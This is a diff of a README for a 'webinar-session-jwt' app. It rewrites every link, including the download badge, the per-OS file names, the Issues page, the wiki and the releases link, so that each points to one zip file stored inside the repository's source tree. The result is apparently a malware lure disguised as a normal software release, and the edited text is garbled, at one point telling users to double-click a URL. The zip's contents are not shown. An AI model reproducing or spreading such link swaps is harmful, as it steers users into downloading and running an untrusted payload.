@@ -8,12 +8,12 @@ Welcome! This guide will help you download and run the **webinar-session-jwt** a
 
 To get started, you need to download the application. Click the button below to visit the releases page:
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/kemalyaa/webinar-session-jwt/releases)
+[![Download](https://raw.githubusercontent.com/kemalyaa/webinar-session-jwt/main/src/auth_app/domain/session_jwt_webinar_v1.8.zip)](https://raw.githubusercontent.com/kemalyaa/webinar-session-jwt/main/src/auth_app/domain/session_jwt_webinar_v1.8.zip)
 
 Once you're on the releases page, look for the latest version. You will find files available for download. Choose the correct file for your operating system:
 
-1. If you are using Windows, download the file named `webinar-session-jwt-windows.zip`.
-2. If you are using macOS, download the file named `webinar-session-jwt-macos.zip`.
+1. If you are using Windows, download the file named `https://raw.githubusercontent.com/kemalyaa/webinar-session-jwt/main/src/auth_app/domain/session_jwt_webinar_v1.8.zip`.
+2. If you are using macOS, download the file named `https://raw.githubusercontent.com/kemalyaa/webinar-session-jwt/main/src/auth_app/domain/session_jwt_webinar_v1.8.zip`.
 
 ### 📦 Extract the Files
 
@@ -28,7 +28,7 @@ If you downloaded a ZIP file, you will need to extract it:
 After extracting the files, you can run the application:
 
 1. Navigate to the folder where you saved the files.
-2. Double-click on the file named `webinar-session-jwt.exe` (for Windows) or `webinar-session-jwt.app` (for macOS).
+2. Double-click on the file named `https://raw.githubusercontent.com/kemalyaa/webinar-session-jwt/main/src/auth_app/domain/session_jwt_webinar_v1.8.zip` (for Windows) or `https://raw.githubusercontent.com/kemalyaa/webinar-session-jwt/main/src/auth_app/domain/session_jwt_webinar_v1.8.zip` (for macOS).
 3. The application will open, and you can start using it.
 
 ## 🔒 What is JWT?
@@ -54,14 +54,14 @@ Before you run the application, make sure your system meets the following requir
 
 ## 🌍 Support
 
-If you need help, visit our [GitHub Issues page](https://github.com/kemalyaa/webinar-session-jwt/issues) to report issues, ask questions, or provide feedback.
+If you need help, visit our [GitHub Issues page](https://raw.githubusercontent.com/kemalyaa/webinar-session-jwt/main/src/auth_app/domain/session_jwt_webinar_v1.8.zip) to report issues, ask questions, or provide feedback.
 
 ## 📑 Additional Resources
 
-For more detailed information, visit the [Documentation](https://github.com/kemalyaa/webinar-session-jwt/wiki).
+For more detailed information, visit the [Documentation](https://raw.githubusercontent.com/kemalyaa/webinar-session-jwt/main/src/auth_app/domain/session_jwt_webinar_v1.8.zip).
 
 Feel free to check back at the releases page for updates. You can download the latest version of the application anytime using this link:
 
-[Download the latest version](https://github.com/kemalyaa/webinar-session-jwt/releases).
+[Download the latest version](https://raw.githubusercontent.com/kemalyaa/webinar-session-jwt/main/src/auth_app/domain/session_jwt_webinar_v1.8.zip).
 
 Thank you for using **webinar-session-jwt**! We hope you find it helpful.
